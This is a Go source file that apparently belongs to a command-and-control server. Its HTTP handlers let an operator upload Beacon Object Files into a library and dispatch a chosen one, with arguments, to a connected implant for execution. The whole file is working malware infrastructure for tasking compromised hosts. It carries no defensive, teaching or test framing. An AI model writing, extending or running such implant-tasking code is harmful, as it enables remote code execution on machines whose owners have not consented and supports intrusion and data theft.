package main

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"strings"
)

// GET  /api/bofs            -> list library
// POST /api/bofs            -> upload {name, file_b64} into library
func bofsHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		writeJSON(w, http.StatusOK, boflib.List())
	case http.MethodPost:
		var body struct {
			Name    string `json:"name"`
			FileB64 string `json:"file_b64"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
			return
		}
		raw, err := base64.StdEncoding.DecodeString(body.FileB64)
		if err != nil {
			http.Error(w, "bad base64 file: "+err.Error(), http.StatusBadRequest)
			return
		}
		name, err := boflib.Add(body.Name, raw)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{"name": name})
	default:
		http.Error(w, "GET/POST only", http.StatusMethodNotAllowed)
	}
}

// POST /api/bofs/{name}/run?implant=<id>  body: {"args":"<b64>"} (optional)
func bofRunHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	rest := strings.TrimPrefix(r.URL.Path, "/api/bofs/")
	parts := strings.SplitN(rest, "/", 2)
	if len(parts) != 2 || parts[1] != "run" {
		http.NotFound(w, r)
		return
	}
	name := parts[0]
	implantStr := r.URL.Query().Get("implant")
	if implantStr == "" {
		http.Error(w, "missing ?implant=<id>", http.StatusBadRequest)
		return
	}
	var body struct {
		Args string `json:"args"`
	}
	if r.ContentLength > 0 {
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
			return
		}
	}
	fileB64, err := boflib.Resolve(name)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	s, ok := manager.Get(parseUintOr(implantStr, 0))
	if !ok {
		http.Error(w, "no such implant", http.StatusNotFound)
		return
	}
	if err := s.Send(serverMsg{Type: "bof", File: fileB64, Args: body.Args}); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"status": "sent", "bof": name})
}

func parseUintOr(s string, def uint64) uint64 {
	var v uint64
	for _, c := range s {
		if c < '0' || c > '9' {
			return def
		}
		v = v*10 + uint64(c-'0')
	}
	if s == "" {
		return def
	}
	return v
}
